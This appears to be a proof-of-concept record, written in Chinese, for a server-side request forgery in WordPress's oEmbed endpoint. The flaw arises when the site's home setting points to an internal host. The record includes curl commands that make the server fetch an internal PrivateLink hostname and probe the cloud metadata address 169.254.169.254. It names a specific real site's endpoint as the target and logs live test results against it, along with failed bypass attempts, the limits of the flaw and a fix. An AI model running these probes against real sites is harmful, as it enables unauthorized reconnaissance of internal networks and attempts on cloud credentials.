# WordPress oEmbed same_host SSRF：home 指向内网主机时的利用验证与升级边界

- **code**: wordpress-oembed-same_host-ssrf-home-指向内网主机时的利用验证与升级边界
- **kind**: script
- **category**: ssrf
- **component**: WordPress
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测：url=http://vpce-...（home 内网 PrivateLink 主机）→ HTTP 200/3064B，provider_url 为该内网主机名，x-cache MISS/age 0；同主机 https 200；10.100.59.173 / 169.254.169.254 字面量、8 种解析绕过、8080 非 oEmbed 路径、/oembed/1.0/proxy（401）全部不可用；源码核对该链路 discover/_fetch_with_format 均 wp_safe_remote_get、redirect 逐跳 validate_redirects。
- **path**: pocs/wordpress-oembed-same_host-ssrf-home-指向内网主机时的利用验证与升级边界/poc.sh
- **tags**: wordpress,oembed,ssrf,same_host,private-link,methodology
- **created_at**: 2026-11-11T20:14:40.022Z
- **engine**: https://www.greenmangaming.com/blog/wp-json/oembed/1.0/embed

## 正文

```
# 适用条件
- WordPress 站点 `/wp-json/oembed/1.0/embed` 未鉴权开放（WP >= 4.4 默认）。
- `get_option('home')` 被配置为内网主机名（AWS PrivateLink endpoint、内网 ALB、10.x 内网域名等），使 `wp_http_validate_url()` 的 `$same_host` 短路跳过私网校验。

# 判据
1. `GET /wp-json/oembed/1.0/embed?url=http://<home内网主机>/<文章>/&_=<rand>` 返回 200 且 JSON `provider_url` 为内网 home 主机 → 服务端真实取址成立（`x-cache: MISS`、`age: 0` 排除缓存）。
2. 对照 `url=http://<同 IP 字面量>/` 返回 404 → 证明走的是 same_host 豁免而非私网直连。

# 验证命令（bash）
```bash
H='vpce-xxxx.vpce-svc-xxxx.us-east-1.vpce.amazonaws.com'   # 从 /wp-json 的 Link/providers/已泄露的 home 值取得
curl -sk -G 'https://TARGET/blog/wp-json/oembed/1.0/embed' \
  --data-urlencode "url=http://$H/<post>/" --data-urlencode "_=r$RANDOM" \
  -w '[http=%{http_code} size=%{size_download}]\n'
curl -sk -G 'https://TARGET/blog/wp-json/oembed/1.0/embed' \
  --data-urlencode 'url=http://169.254.169.254/latest/meta-data/' -w '%{http_code}\n'  # 应 404
```

# 升级边界（必须逐项实测，别假设）
- host：`wp_http_validate_url()` 仅对 `same_host`（strtolower 比较 `home` 主机名）跳过私网段；user/pass、host 含 `:#?[]` 直接拒；非 same_host 一律解析 IP 后拒 127/10/0/172.16-31/192.168/169.254/100.64-127/224-239/240+。
- port：白名单 `http_allowed_safe_ports = [80,443,8080]`；仅同 `home` 端口额外放行。
- redirect：`WP_Http::request()` 在 `reject_unsafe_urls=true` 时注册 `requests.before_redirect → validate_redirects`，逐跳校验，私网跳转抛异常。
- 二级取址：`WP_oEmbed::discover()` 与 `_fetch_with_format()` 都用 `wp_safe_remote_get`，provider URL 同样过校验。
- proxy 路由：`/wp-json/oembed/1.0/proxy` 需 capability，匿名 401 `rest_forbidden`。
- 数据面：oEmbed 只回显「可发现 application/json+oembed link 的 HTML 页面」元数据；JSON/源码/后台页/feed/.git 均 404，读不到。
- 出口：源站若在 VPC 内无公网 egress，YouTube 等已知 provider 直取也会 404 —— 可用来判定 OOB 通道不存在。

# 结论口径
此类缺陷是「受限 SSRF」：可匿名探测/读取 home 主机自身的公开 oEmbed 元数据，不能触达 IMDS 或其它内网主机，不能落会话/隧道。报告时写清上限与逐项判据；修复=改回公网 home/siteurl + 出站白名单。
```
